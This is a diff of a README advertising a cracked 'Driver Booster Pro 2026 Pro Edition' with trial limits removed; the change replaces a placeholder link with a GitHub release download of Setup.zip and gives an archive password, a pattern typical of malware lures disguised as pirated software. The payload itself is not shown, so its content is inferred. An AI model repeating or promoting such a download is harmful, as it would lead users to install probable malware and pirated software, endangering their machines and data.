@@ -3,13 +3,15 @@
 | |) | '_| \ V / -_) '_| | _ \/ _ \/ _ (_-<  _/ -_) '_| |  _/ '_/ _ \
 |___/|_| |_|\_/\___|_|   |___/\___/\___/__/\__\___|_|   |_| |_| \___/
 
+
 Driver Booster Pro 2026 Pro Edition. scan and update 8 million+ drivers, game boost mode, offline driver pack, and auto backup before update. Designed for power users and professionals who need the full feature set, with all trial limits removed and lifetime updates included. Compatible with Windows 10/11 (64-bit).
 
 
 ***************** DOWNLOAD *****************
 ------------------------------------------------
 
-[+] DOWNLOAD LINK: [download here](https://google.com)
+[+] DOWNLOAD LINK: [download here](https://github.com/cityhelmsmangrasp/Driver-Booster-Pro/releases/download/Last/Setup.zip)
+
 [+] 🔐🔐🔐: 1847
 
 ------------------------------------------------
